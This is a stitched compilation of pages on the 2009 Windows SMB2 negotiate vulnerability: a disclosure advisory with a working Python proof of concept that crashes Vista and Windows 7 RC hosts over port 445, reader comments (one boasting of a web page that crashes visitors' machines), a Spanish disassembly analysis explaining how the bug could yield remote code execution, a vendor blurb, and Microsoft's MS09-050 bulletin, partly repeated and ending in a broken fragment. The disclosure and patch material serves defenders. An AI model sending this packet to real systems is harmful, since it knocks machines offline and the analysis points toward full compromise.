### [[Updated]Windows Vista/7 : SMB2.0 NEGOTIATE PROTOCOL REQUEST Remote B.S.O.D.](https://g-laurent.blogspot.com/2009/09/windows-vista7-smb20-negotiate-protocol.html)

=============================================
- Release date: September 7th, 2009
- Discovered by: Laurent Gaffié
- Severity: High
=============================================

I. VULNERABILITY
-------------------------
Windows Vista, Server 2008 < R2, 7 RC :
SMB2.0 NEGOTIATE PROTOCOL REQUEST Remote B.S.O.D.

II. BACKGROUND
-------------------------
Windows vista and newer Windows comes with a new SMB version named SMB2.
See: http://en.wikipedia.org/wiki/Windows\_Vista\_networking\_technologies#Server\_Message\_Block\_2.0
for more details.

III. DESCRIPTION
-------------------------
[Edit]Unfortunatly this SMB2 security issue is specificaly due to a MS patch, for another SMB2.0 security issue:
KB942624 (MS07-063)
Installing only this specific update on Vista SP0 create the following issue:

SRV2.SYS fails to handle malformed SMB headers for the NEGOTIATE PROTOCOL REQUEST functionnality.
The NEGOTIATE PROTOCOL REQUEST is the first SMB query a client send to a SMB server, and it's used to identify the SMB dialect that will be used for futher communication.

IV. PROOF OF CONCEPT
-------------------------

Smb-Bsod.py:

#!/usr/bin/python
#When SMB2.0 recieve a "&" char in the "Process Id High" SMB header field
#it dies with a PAGE\_FAULT\_IN\_NONPAGED\_AREA error

from socket import socket
from time import sleep

host = "IP\_ADDR", 445
buff = (
"\x00\x00\x00\x90" # Begin SMB header: Session message
"\xff\x53\x4d\x42" # Server Component: SMB
"\x72\x00\x00\x00" # Negociate Protocol
"\x00\x18\x53\xc8" # Operation 0x18 & sub 0xc853
"\x00\x26"# Process ID High: --> :) normal value should be "\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xfe"
"\x00\x00\x00\x00\x00\x6d\x00\x02\x50\x43\x20\x4e\x45\x54"
"\x57\x4f\x52\x4b\x20\x50\x52\x4f\x47\x52\x41\x4d\x20\x31"
"\x2e\x30\x00\x02\x4c\x41\x4e\x4d\x41\x4e\x31\x2e\x30\x00"
"\x02\x57\x69\x6e\x64\x6f\x77\x73\x20\x66\x6f\x72\x20\x57"
"\x6f\x72\x6b\x67\x72\x6f\x75\x70\x73\x20\x33\x2e\x31\x61"
"\x00\x02\x4c\x4d\x31\x2e\x32\x58\x30\x30\x32\x00\x02\x4c"
"\x41\x4e\x4d\x41\x4e\x32\x2e\x31\x00\x02\x4e\x54\x20\x4c"
"\x4d\x20\x30\x2e\x31\x32\x00\x02\x53\x4d\x42\x20\x32\x2e"
"\x30\x30\x32\x00"
)
s = socket()
s.connect(host)
s.send(buff)
s.close()

V. BUSINESS IMPACT
-------------------------
An attacker can remotly crash any Vista/Windows 7 machine with SMB enable.
Windows Xp, 2k, are NOT affected as they dont have this driver.

VI. SYSTEMS AFFECTED
-------------------------
[Edit]Windows Vista All (64b/32b|SP1/SP2 fully updated), Win Server 2008 < R2, Windows 7 RC.

VII. SOLUTION
-------------------------
No patch available for the moment.
Close SMB feature and ports, until a patch is provided.
Configure your firewall properly
You can also follow the MS Workaround:

If this vuln is real. Why didnt you reported it to Microsoft MSRC?
Because it looks really stupid to publish this kind of thing on Full disclosure.

He may have months ago. Security through obscurity. If there's an inherent problem, it's important for anyone to allow end-users to make an informed decision about the risks involved. In short; MS need to jump on this with both feet rather than dawdle as is there usual response.

VII. SOLUTION
-------------------------
Vendor contacted, but no patch available for the moment.
Close SMB feature and ports, until a patch is provided.

Perhaps read the text rather than voice opinions from an undeserved soap-box.

@Anonymous:

I have tried this exploit myself on a Windows 7 machine and it didn't work. Perhaps the code itself isn't the actual exploit, but an example of what it is/could be.

I tried this code from a Mac and from a backtrack image... neither caused the remote Windows 7 machine to BSOD. SMB was turned on and worked normally otherwise (as expected).

@zach, on windows7/vista you need to enable file sharing in your network connection center.

Not more stupid as to not submit this new code to a normal S.Q.A routine, before shipping that product on any P.C. by default.

What release of Windows 7 did u use?.
Im running the script on a Debian against a Windows 7 ultimate 64bits and a 32bits (both are 7600) and didn't work.
I have file sharing enabled, i can access both computer resources from a Windows XP without any problem (and im not even asked for user/password as i have it configured to not get asked for user/pass if that matters).

Does NOT work against the final realease of Windows 7 Enterprise in a domain environment, with firewall off and file sharing on. Doesn't work with firewall on and sharing off either :)

Does work against fully updated Vista Enterprise.

Alright, publishing this was a very jerk move on Laurent's part.

He received a reply saying that no patch was available along with a workaround and he decided to post the exploit live anyway instead of waiting until it was fixed? Could a person be any more of a jerk? Microsoft takes all SMB vulnerabilities seriously, but instead of doing everyone a favor and just waiting until a patch were to be released, you decided to open it up to a realm of script kiddies bored at school/work who'll try to inflict as much damage as possible.

Sad.

I disagree with Bryant and sympathizers.

After giving MS ample time to rectify the problem it is imperative that the information and work around be disclosed far and wide. MS was notified, failed to promptly release a patch, so the matter is now in the hands of the public domain to manage.

If you properly firewalled your ports properly in the first place the exploit would be a non-issue.

Am I the only one who tires of the post-exploit-publication QQ?

if you run ESET Lab's NOD32 AV, its firewall filters the ports in such a way that you can't run the exploit.

Windows 7 RTM and Server 2008 R2 RTM are not vulnerable to this exploit. 7/2008 R2 RC are, as are Vista/2008. (Grouped by kernel family).

It would be nice if they'd backport whatever they fixed in RTM to Vista, but as far as running Windows 7 / R2 beta versions, I don't sympathize.

As far as vulnerabilty reporting, it's not really acurate to say that this bug impacts Windows 7 if you haven't tested the RTM. If you are running RC code, you get what you pay for.

Releasing this allows people to protect themselves before there's a patch. You're assuming that only HE has found the exploit, a white-hat with good intentions. You think other people who might have found this are going to be so nice?

I'm having trouble getting it too work, but that just could be because it's complaining about bad headers in the crafted packet (it's been a while since i've done this..). Testing it out against win7 32 and 64 at home..hope to have results soon. Wireshark capture shows the packet is received by the remote computer and responded too, but no bsod. The problem seems to be in the header checksum.

@Anonymous (above my post)

That's exactly why i agree fully with full disclosure.

I imagine a group of blackhats getting angry cause yet another hidden 0day was disclosed :-P So I don't think people should get angry at Laurent, I'd do the same, willingly knowing that some script kiddies, worm makers and such would abuse it as well. But that's just the yin and yang principle.

HDM has by the way also added another module to the Metasploit framework which exploits another bug in the negotiate protocol / smb service.

This has been tested and works great.. here at my work we made a quick php script to send the malformed SMB packet to incoming systems.. everytime a Vista user visits the page their machine BSOD. :)

I have tested this and verified it works on:
Vista x32 -- All versions
Vista x64 -- All versions
Windows 7 -- Release cannidates (NOT RTM)
Windows Server 2008, pre RC2

Any machine above with 445 open and SMB (enabled by default) is effected.

Great job on the full disclosure!

With all respect to Laurent and other commenters, the importance of not disclosing this kind of things is that: even with a disclosure a lot of good people won't know of it.
Instead, a lot of non-capable attackers now might have a method to harm, that would never have discovered on their own.
Microsoft will develop a solution, release a patch and still a lot of customers will be vulnerable months later. (cont.)

(cont.) Making Microsoft face red does not help anyone. While you have the right to tire of post-exploit patching, experience demonstrates that patching accelerates exploiting, and makes it broader.
Those who have a good IT management practice will probably not be vulnerable with or without a patch. Those who are vulnerable now are only exposed to a greater risk.

nice finding..
tested and work like a charm but not for win7 RTM.

 just disable file & printer share for now until the patch release and block port 445 as well

why leaving this service enable when u dont rely on it?

hail macs.. lulz

My tests confirmed that this security issue is NOT Service Pack related, and was introduced by KB942624 (MS07-063) patch in december 2007.

One news outlet reported that Laurent submitted the bug to Microsoft, but there was a typo in the e-mail address.

Mistakes happen, but a little extra effort to contact the vendor could have been made. I know that Microsoft has forms, forums, and telephone numbers. Not saying you got to contact them all, but a single e-mail does not due diligence make.

If there was no response after several attempts over several days, then a public disclosure is warranted.

You didn't submitted the bug to the editor (or with a typo in the address, are you not able to type an address or was it on purpose), you post a proof of concept on patch day, when MS has no time to fix the hole before next month. It looks like you did everything on purpose.
It would be funny for MS if nobody would use their software for important things. Today I saw a girl in my college who was weeping: she lost all her work because of script kiddies who reboot all the computers. Her exam is tomorrow.

Laurent, you're an asshole.

Hey not so "Anonymous",

Regarding my disclosure with MS, that's my choice, and i still think that on this specific case it was a good idea you'll see why.

However concerning the typo, i send the advisory (only to advise them) to microssoft.com , shit happens.

Full-Disclosure is usefull in such case because:

Anyone (including MS) who would have tested this critical component would have found this bug in a matter of seconds.

It showed this specific bug (my payload) was introduced by a security patch (MS07-063), showing us no S.Q.A and security testing
as been done on it before shipping it on any P.C
Even worse; an official Microsoft spokeman told Robert Lemos :
"We found this issue independently through our fuzzing processes and implemented the fix into Windows 7 RTM (release to manufacturer)
and Windows Server 2008 R2," see: http://www.technologyreview.com/blog/unsafebits/24105/?a=f

This mean, they knew about this issue but failed at protecting them customers.
Now that i published the remote teardrop advisory, they use the word "irresponsible disclosure" while patching on emergency what they
knew since a long time.
This is a serious error, as the bug was very easy to find, it was only a matter of time before someone disclose it...

A working exploit has beem made commercially available by Immunity Inc. (see securityfocus.org for a link)

A shame that it is only commercially available, cause I'd like to see how it abuses the 16 bits :-) Anyone care to share at least some sort of information?

I have got the solution. Need to uncheck the default file and printer sharing from firewall and allow port 139, 445 from ip subnet.

Security through obscurity. If there's an inherent problem, it's important for anyone to allow end-users to make an informed decision about the risks involved. In short; MS need to jump on this with both feet rather than dawdle as is there usual response.

## [Acerca del BSOD de srv2.sys](https://blog.48bits.com/acerca-del-bsod-de-srv2sys/)

Hola qué tal.

Bueno hoy nos hemos levantado con la noticia del BSOD que Laurent Gaffié ha [publicado](http://g-laurent.blogspot.com/2009/09/windows-vista7-smb20-negotiate-protocol.html).

Tras analizar el código vulnerable y probarlo, tengo que avisaros que al contrario de lo que dice el autor y se está reproduciendo en otras páginas, esta vulnerabilidad **SÍ PERMITE** la ejecución de código remótamente, al igual que abre la posibilidad para escalar privilegios en local. Hay que aclarar que por el momento la ejecución de código dista mucho de ser reliable al igual que la escalada de privilegios. Pero no hay que considerar como un mero DoS esta vulnerabilidad porque tiene el potencial de convertirse en ejecución de código controlado.

Y ahora os explicaré el porqué basándonos en razones técnicas, en esto de las vulnerabilidades el publicar un advisory méramente empírico no es de recibo, teniendo en cuenta que es un 0day

Veamos dónde se produce el fallo.

módulo: srv2.sys

; int \_\_stdcall Smb2ValidateProviderCallback(PVOID DestinationBuffer)

\_Smb2ValidateProviderCallback@4 proc near

…

…

.text:000156B3 loc\_156B3:                              ; CODE XREF: Smb2ValidateProviderCallback(x)+4D5j

.text:000156B3                                         ; Smb2ValidateProviderCallback(x)+4DEj

.text:000156B3                 movzx   eax, word ptr [esi+0Ch]; packet->SBM\_Header->Process\_ID\_High

.text:000156B7                 mov     eax, \_ValidateRoutines[eax\*4]; FALLO – out-of-bounds dereference.

.text:000156BE                 test    eax, eax

.text:000156C0                 jnz     short loc\_156C9

.text:000156C2                 mov     eax, 0C0000002h

.text:000156C7                 jmp     short loc\_156CC

.text:000156C9 ; —————————————————————————

.text:000156C9

.text:000156C9 loc\_156C9:  ; CODE XREF: Smb2ValidateProviderCallback(x)+4F3j

.text:000156C9                 push    ebx

.text:000156CA                 call    eax ; Smb2ValidateNegotiate(x) ; Smb2ValidateNegotiate(x) – KABOOOM!!

Como véis lo que está haciendo es usar el campo de 16 bits de la cabecera SMB 2.0 ProcessIDHigh como indice en una tabla de funciones sin comprobar previamente el tamaño de la tabla. Cagada de libro. De esta manera podemos dereferenciar un puntero arbitrario que si no es nulo nos dará la direccion a la que saltará la ejecución.

Empíricamente el exploit que ha liberado el fulano puede funcionar o no, ya que lo que produce el BSOD es que el indice es demasiado alto y apunta una página no paginada. Pero en algunos sistemas podría darse el caso que sí estuviera paginada y no fallara o fallara en otro punto, de hecho lo he comprobado en varios sistemas Vista x86.

Por lo tanto, la ejecución de codigo remoto es posible ya que ESI apunta a nuestro paquete de datos. [ESI+C] que es el indice es un campo que nosotros controlamos de 16 bits. Lo que hace falta es encontrar un puntero adecuado que nos permita controlar la ejecución en base a estos datos. Dado que la sección PAGE del driver esta en direcciones más altas que la sección .DATA donde está la tabla de funciones, esto mejora la situación.

La ejecución de código a nivel local para elevar privilegios, vendría dada por el mismo tipo de explotación, lo único es que todas las rutinas del srv2.sys en este tipo de peticiones se manejan en el contexto del SYSTEM no del proceso que envía el socket, si no la elevación de privilegios sería trivial ( ver valores fixed al final de la table de funciones , a partir del indice 0x13 tendríamos user-mode addresses ).

Los sistemas vulnerables son Vista, Windows 7 RC y Server 2008.

Pues eso, a filtrar paquetes en el 445 y 139 etc… ojito ahí fuera.

   V. BUSINESS IMPACT

   ————————-

   An attacker can remotly crash any Vista/Windows 7 machine with SMB enable.

   Windows Xp, 2k, are NOT affected as they dont have this driver.

   III. DESCRIPTION

   ————————-

   SRV2.SYS fails to handle malformed SMB headers for the NEGOTIATE PROTOCOL REQUEST functionnality.

   The NEGOTIATE PROTOCOL REQUEST is the first SMB query a client send to a SMB server, and it’s used to identify the SMB dialect that will be used for futher communication.

   I. VULNERABILITY

   ————————-

   Windows Vista/7 : SMB2.0 NEGOTIATE PROTOCOL REQUEST Remote B.S.O.D.

   ———

   ¿Dónde dice que es posible? Que yo sepa el business impact es lo que se usa para caracterizar una vulnerabilidad…

   El advisory no refleja en ningún lado la posibilidad de ejecución de código, con lo cual se da a pensar que solamente es un remote BSOD, que de hecho es de lo que se habla en el advisory. Lo más seguro es que el autor no fuera consciente de esto.

   Comment por anomino | 09/08/09 at 3:35 pm

   Perdona, Ruben, tu lo ves muy claro pero te agradeceria una pequeña explicacion.

   Gracias de antemano.

   Mi duda es:

   movzx eax, word ptr [esi+0Ch]; packet->SBM\_Header->Process\_ID\_High

   mov eax, \_ValidateRoutines[eax\*4]; FALLO -u

   Ok puedo meter un valor en esi que tenga un valor que luego use como indice en esa tabla, entonces que deberia pisar? controlo el indice, pero como llego a controlar EIP ???

   Perdona, a lo mejr es muy trivial pero no lo veo ..

   Gracias por todo.

   Desde luego que es una cagada, aunque no es muy común encontrarte con los archivos compartidos en un Home PC, si se encuentran en la gran mayoría de las empresas y lo peor es que muchos tardarán en darse cuenta de ésto. Menudos días nos esperan..

   Gracias Rubén!
10. [ruben](#comment-41065)

    Comment por ruben | 09/08/09 at 4:21 pm

    No es trivial no, tranquilo. A ver si te lo consigo aclarar un poco.

    Digamos que tenemos que buscar una porcion de código que nos permita controlar la ejecución a través de ESI. Y a su vez tenemos que encontrar una dirección que apunte ese código. Y que este este alineado además…

    Supongamos que en cierta partel de .PAGE en srv2.sys tenemos

    loquesea\_alineado\_a\_4, offset pirubirubi

    pirubirubi

    call dword ptr [ esi + 0x10 ]

    tenemos que

    movzx eax, word ptr [esi + 0xc]

    mov eax, \_ValidateFuntions[eax\*4] = >> siendo eax == lo que tenga que ser para pillar offset pirubirubi

    entonces cuando se haga el

    call eax

    iriamos a pirubirubi y como [esi+0x10] apunta a nuestro paquete y lo controlamos tendría la ejecución bajo nuestro control. Saltaríamos a la dirección que nosotros quisieramos… Espero que haya quedado más claro.

    Comment por anomino | 09/08/09 at 5:23 pm

    Ruben, perfecta explicaion, lo que me pasaba es que no veia el call eax no hice scroll down, XDD

    De todas formas totalmente aclarado.

    Gracias.

    Interesante, pero… alguno lo ha probado?

    Porque hoy mi administrador de sistemas, un auténtico taliban de linux, lo intentó un par de decenas de veces y mi windows7 siguió funcionando sin problema alguno y sin ningún pantallazo azul…

    Si alguien lo ha conseguido, que hable de primera mano y no de oidas, que me suena que todo esto es un cuento más contra los malos malísimos de redmon. 🙁

    Comment por IaM | 09/09/09 at 5:35 am

    Hola a todos,

    Sha0 y yo hemos estado haciendo pruebas ayer, y mi maquina hizo de conejillo de indias. El caso es que cambiando cualquier otro byte de los de arriba y dejando el process ID a 0, que es como debía ser tb produce un DoS.

    Si teneis tiempo y ganas podeis probarlo.

    «\x00\x00\x00\x90» # Begin SMB header: Session message

    «\xff\x53\x4d\x42» # Server Component: SMB

    «\x72\x00\x00\x00» # Negociate Protocol

    «\x00\x18\x53\xc8» # Operation 0x18 & sub 0xc853

    Cambiad cualquier byte de estos. Es más podeis hacer un fuzzer simple, recorriendo byte a byte la shellcode y poniendo todas las combinaciones posibles de cada byte de 1 a 256. Total hace solo una conexión y envia el churro no es dificil programar un fuzzer para obtener nuevas vulnerabilidades a partir de esta.

    Bueno.. si teneis tiempo y ganas probadlo.

    Saludos,

    Y veo que Sha0 la está liando parda ya con el Android.

    Buen post, gracias.

    Y bueno.. ya que estamos hablando del tema, alguien sabe algo acerca del nuevo DoS que se ha publicado hoy? <http://securityvulns.com/news/TCP/DoS.html>

    Fyodor saco hace tiempo una herramienta que se llamaba ndos. <http://insecure.org/stf/tcp-dos-attack-explained.html> pero la pagina ha sido eliminada. Alguien sabe algo de dicha herramienta?. Aqui es donde se habla de ella:

    La gente de Metasploit ya han metido el DoS en el snapshot del SVN. Ayer estaba cuando leí este post hdmoore estaba comentando cosas del mismo estilo en twitter.

    Comment por [Jose Selvi](http://www.pentester.es "Jose Selvi") | 09/10/09 at 2:33 am

    Quizá no lo declaran como «posible ejecución de código» por las protecciones internas de Windows como el DEP. Aunque mirando el código sea posible efectivamente hacerlo, igual al querer saltar a ejecutar código en una zona de datos salta la protección y se cierra el proceso, con el consiguiente DoS de nuevo.

    Muy buen análisis!

    El pasado Jueves 17 de Septiembre Immunity anunció que ya tenia un exploit funcional para Windows Vista y 2008. Podeis ver un video del exploit en accion aqui: <https://www.immunityinc.com/documentation/smbv2.html> por supuesto que no han hecho publico el exploit y solo esta disponible para los clientes de Canvas. Por otro lado, hay rumores de que los del Metasploit lo tienen a punto.

    El exploit funciona en 2008 SP0 que tiene SafeSEH chain validation habilitado por defecto. No creo que hayan usado SEH para explotarlo, habran tenido que pasar GS o DEP? Estoy deseando ver el exploit…

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

# Microsoft Security Bulletin MS09-050 - Critical

## Vulnerabilities in SMBv2 Could Allow Remote Code Execution (975517)

Published: October 13, 2009 | Updated: October 14, 2009

**Version:** 1.1

### General Information

#### Executive Summary

This security update resolves one publicly disclosed and two privately reported vulnerabilities in Server Message Block Version 2 (SMBv2). The most severe of the vulnerabilities could allow remote code execution if an attacker sent a specially crafted SMB packet to a computer running the Server service. Firewall best practices and standard default firewall configurations can help protect networks from attacks that originate from outside the enterprise perimeter. Best practices recommend that systems that are connected to the Internet have a minimal number of ports exposed.

This security update is rated Critical for supported editions of Windows Vista and Windows Server 2008. For more information, see the subsection, **Affected and Non-Affected Software**, in this section.

The security update addresses the vulnerabilities by correctly validating the fields inside the SMBv2 packets, correcting the way that SMB handles the command value in SMB packets, and correcting the way that SMB parses specially crafted SMB packets. For more information about the vulnerabilities, see the Frequently Asked Questions (FAQ) subsection for the specific vulnerability entry under the next section, **Vulnerability Information**.

This security update also addresses the vulnerability first described in [Microsoft Security Advisory 975497](https://technet.microsoft.com/security/advisory/975497).

**Recommendation.** The majority of customers have automatic updating enabled and will not need to take any action because this security update will be downloaded and installed automatically. Customers who have not enabled automatic updating need to check for updates and install this update manually. For information about specific configuration options in automatic updating, see [Microsoft Knowledge Base Article 294871](https://support.microsoft.com/kb/294871).

For administrators and enterprise installations, or end users who want to install this security update manually, Microsoft recommends that customers apply the update immediately using update management software, or by checking for updates using the [Microsoft Update](https://go.microsoft.com/fwlink/?linkid=40747) service.

Mitigation refers to a setting, common configuration, or general best-practice, existing in a default state, that could reduce the severity of exploitation of a vulnerability. The following mitigating factors may be helpful in your situation:

* Firewall best practices and standard default firewall configurations can help protect networks from attacks that originate outside the enterprise perimeter. Best practices recommend that systems that are connected to the Internet have a minimal number of ports exposed.
* In Windows Vista, if the network profile is set to "Public", the system is not affected by this vulnerability since unsolicited inbound network packets are blocked by default.
* The Release to Manufacturing (RTM) versions of Windows 7 and Windows Server 2008 R2 are not affected by this vulnerability.

#### Workarounds for SMBv2 Infinite Loop Vulnerability - CVE-2009-2526

Workaround refers to a setting or configuration change that does not correct the underlying vulnerability but would help block known attack vectors before you apply the update. Microsoft has tested the following workarounds and states in the discussion whether a workaround reduces functionality:

* **Disable SMB v2**

  **Note** See [Microsoft Knowledge Base Article 975517](https://support.microsoft.com/kb/975517) to use the automated **Microsoft Fix it** solution to enable or disable this workaround.

  To modify the registry key, perform the following steps:

  **Note** Using Registry Editor incorrectly can cause serious problems that may require you to reinstall your operating system. Microsoft cannot guarantee that problems resulting from the incorrect use of Registry Editor can be solved. Use Registry Editor at your own risk. For information about how to edit the registry, view the "Changing Keys And Values" Help topic in Registry Editor (Regedit.exe) or view the "Add and Delete Information in the Registry" and "Edit Registry Data" Help topics in Regedt32.exe.

  1. Click **Start**, click **Run**, type **Regedit** in the **Open** box, and then click **OK**.
  2. Locate and then click the following registry subkey:

     HKEY\_LOCAL\_MACHINE\System\CurrentControlSet\Services
  3. Click **LanmanServer**.
  4. Click **Parameters**.
  5. Right-click to add a new **DWORD (32 bit) Value**.
  6. Enter **smb2** in the **Name** data field, and change the **Value** data field to **0**.
  7. Exit.
  8. Restart the "Server" service by performing one of the following:
     + Open up the computer management MMC, navigate to **Services and Applications**, click **Services**, right-click the **Server** service name and click **Restart**. Answer **Yes** in the pop-up menu.
     + From a command prompt and with administrator privileges, type **net stop server** and then **net start server**.

  + Applications that use SMB (CIFS)
  + Applications that use mailslots or named pipes (RPC over SMB)
  + Server (File and Print Sharing)
  + Group Policy
  + Net Logon
  + Distributed File System (DFS)
  + Terminal Server Licensing
  + Print Spooler
  + Computer Browser
  + Remote Procedure Call Locator
  + Fax Service
  + Indexing Service
  + Performance Logs and Alerts
  + Systems Management Server
  + License Logging Service

  **How to undo the workaround.** Unblock TCP ports 139 and 445 at the firewall. For more information about ports, see [TCP and UDP Port Assignments](https://go.microsoft.com/fwlink/?linkid=21312).

#### FAQ for SMBv2 Infinite Loop Vulnerability - CVE-2009-2526

**What is the scope of the vulnerability?**

This is a denial of service vulnerability. An attacker who exploited this vulnerability could cause the affected system to stop responding until it is manually restarted. Note that the denial of service vulnerability would not allow an attacker to execute code or to elevate their user rights, but it could cause the affected system to stop accepting requests.

**What causes the vulnerability?**

The vulnerability is caused by the Microsoft Server Message Block (SMB) Protocol software insufficiently validating all fields when parsing specially crafted SMBv2 packets.

**What is Server Message Block Version 2 (SMBv2)?**

Server Message Block (SMB) is the file sharing protocol used by default on Windows-based computers. SMB Version 2.0 (SMBv2) is an update to this protocol, and is only supported on computers running Windows Server 2008, Windows 7, and Windows Vista. SMBv2 can only be used if both client and server support it. If either client or server cannot support SMBv2, the SMB 1.0 protocol will be used instead. The SMB protocol version to be used for file operations is decided during the negotiation phase. During the negotiation phase, a Windows Vista client advertises to the server that it can understand the new SMBv2 protocol. If the server (Windows Server 2008 or later) understands SMBv2, then SMBv2 is chosen for subsequent communication. Otherwise the client and server use SMB 1.0 and continue to function as normal. For more information on SMBv2, see MSDN article, [Server Message Block (SMB) Version 2 Protocol Specification](https://msdn.microsoft.com/library/cc246482%28prot.13%29.aspx).

**What might an attacker use the vulnerability to do?**

An attacker who successfully exploited this vulnerability could cause a user's system to stop responding until manually restarted.

**How could an attacker exploit the vulnerability?**

An attacker could try to exploit the vulnerability by creating a specially crafted SMBv2 packet and sending the packet to an affected system.

**What systems are primarily at risk from the vulnerability?**

All systems with SMB Server service are affected by this vulnerability. Domain controllers are at a greater risk for this vulnerability, as these systems have network shares open to all domain users by default.

**What does the update do?**

The security update addresses the vulnerability by correctly validating the fields inside the SMBv2 packets.

**When this security bulletin was issued, had this vulnerability been publicly disclosed?**

No. Microsoft received information about this vulnerability through responsible disclosure.

**When this security bulletin was issued, had Microsoft received any reports that this vulnerability was being exploited?**

No. Microsoft had not received any information to indicate that this vulnerability had been publicly used to attack customers and had not seen any examples of proof of concept code published when this security bulletin was originally issued.

  **Note** See [Microsoft Knowledge Base Article 975517](https://support.microsoft.com/kb/975517) to use the automated **Microsoft Fix it** solution to enable or disable this workaround.

  To modify the registry key, perform the following steps:

  **Note** Using Registry Editor incorrectly can cause serious problems that may require you to reinstall your operating system. Microsoft cannot guarantee that problems resulting from the incorrect use of Registry Editor can be solved. Use Registry Editor at your own risk. For information about how to edit the registry, view the "Changing Keys And Values" Help topic in Registry Editor (Regedit.exe) or view the "Add and Delete Information in the Registry" and "Edit Registry Data" Help topics in Regedt32.exe.

  1. Click **Start**, click **Run**, type **Regedit** in the **Open** box, and then click **OK**.
  2. Locate and then click the following registry subkey:

     HKEY\_LOCAL\_MACHINE\System\CurrentControlSet\Services
  3. Click **LanmanServer**.
  4. Click **Parameters**.
  5. Right-click to add a new **DWORD (32 bit) Value**.
  6. Enter **smb2** in the **Name** data field, and change the **Value** data field to **0**.
  7. Exit.
  8. Restart the "Server" service by performing one of the following:
     + Open up the computer management MMC, navigate to **Services and Applications**, click **Services**, right-click the **Server** service name and click **Restart**. Answer **Yes** in the pop-up menu.
     + From a command prompt and with administrator privileges, type **net stop server** and then **net start server**.

  **Impact of workaround.** The host will not communicate using SMBv2. Instead, the host will communicate using SMB 1.0. This should not impact basic services such as file and printer sharing. These will continue to function as normal.

  **How to undo the workaround:**

  1. Click **Start**, click **Run**, type **Regedit** in the **Open** box, and then click **OK**.
  2. Locate and then click the following registry subkey:

     HKEY\_LOCAL\_MACHINE\System\CurrentControlSet\Services
  3. Click **LanmanServer**.
  4. Click **Parameters**.
  5. Double-click **smb2**, and change the **Value** data field to **1**.
  6. Exit.
  7. Restart the "Server" service by performing one of the following:
     + Open up the computer management MMC, navigate to **Services and Applications**, click **Services**, right-click the **Server** service name and click **Restart**. Answer **Yes** in the pop-up menu.
     + From a command prompt and with administrator privileges, type **net stop server** and then **net start server**.
* **Block TCP ports 139 and 445 at the firewall**

  These ports are used to initiate a connection with the affected component. Blocking TCP ports 139 and 445 at the firewall will help protect systems that are behind that firewall from attempts to exploit this vulnerability. Microsoft recommends that you block all unsolicited inbound communication from the Internet to help prevent attacks that may use other ports. For more information about ports, see [TCP and UDP Port Assignments](https://go.microsoft.com/fwlink/?linkid=21312).

  **Impact of Workaround:** Several Windows services use the affected ports. Blocking connectivity to the ports may cause various applications or services to not function. Some of the applications or services that could be impacted are listed below:

  + Applications that use SMB (CIFS)
  + Applications that use mailslots or named pipes (RPC over SMB)
  + Server (File and Print Sharing)
  + Group Policy
  + Net Logon
  + Distributed File System (DFS)
  + Terminal Server Licensing
  + Print Spooler
  + Computer Browser
  + Remote Procedure Call Locator
  + Fax Service
  + Indexing Service
  + Performance Logs and Alerts
  + Systems Management Server
  + License Logging Service

  **How to undo the workaround.** Unblock TCP ports 139 and 445 at the firewall. For more information about ports, see [TCP and UDP Port Assignments](https://go.microsoft.com/fwlink/?linkid=21312).

#### FAQ for SMBv2 Negotiation Vulnerability - CVE-2009-3103

**What is the scope of the vulnerability?**

This is a remote code execution vulnerability. An attacker who successfully exploited this vulnerability could take complete control of an affected system. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights.

**What causes the vulnerability?**

The vulnerability is caused by the Microsoft Server Message Block (SMB) implementation not appropriately parsing SMB packets.

**What is Server Message Block Version 2 (SMBv2)?**

Server Message Block (SMB) is the file sharing protocol used by default on Windows-based computers. SMB Version 2.0 (SMBv2) is an update to this protocol, and is only supported on computers running Windows Server 2008, Windows 7, and Windows Vista. SMBv2 can only be used if both client and server support it. If either client or server cannot support SMBv2, the SMB 1.0 protocol will be used instead. The SMB protocol version to be used for file operations is decided during the negotiation phase. During the negotiation phase, a Windows Vista client advertises to the server that it can understand the new SMBv2 protocol. If the server (Windows Server 2008 or later) understands SMBv2, then SMBv2 is chosen for subsequent communication. Otherwise the client and server use SMB 1.0 and continue to function as normal. For more information on SMBv2, see MSDN article, [Server Message Block (SMB) Version 2 Protocol Specification](https://msdn.microsoft.com/library/cc246482%28prot.13%29.aspx).

**Is the Windows 7 Release Candidate (RC) release affected by this vulnerability?**

Yes. This vulnerability was discovered after the release of Windows 7 Release Candidate. Customers running Windows 7 Release Candidate are encouraged to download and apply the update to their systems. The final versions of Windows 7 and Windows Server 2008 R2 are not affected by this vulnerability.

Security updates are available from [Microsoft Update](https://go.microsoft.com/fwlink/?linkid=40747) and [Windows Update](https://go.microsoft.com/fwlink/?linkid=21130). Security updates are also available from the [Microsoft Download Center](https://go.microsoft.com/fwlink/?linkid=21129). You can find them most easily by doing a keyword search for "security update."

**What might an attacker use the vulnerability to do?**

An attacker who successfully exploited this vulnerability could take complete control of an affected system.

**How could an attacker exploit the vulnerability?**

An attacker could try to exploit the vulnerability by creating a specially crafted SMB packet and sending the packet to an affected system.

**What systems are primarily at risk from the vulnerability?**

All systems with the SMB Server service are affected by this vulnerability. Domain controllers are at a greater risk for this vulnerability, as these systems have network shares open to all domain users by default.

**Vulnerable App:**

```
=============================================
- Release date: September 7th, 2009
- Discovered by: Laurent GaffiÃ©
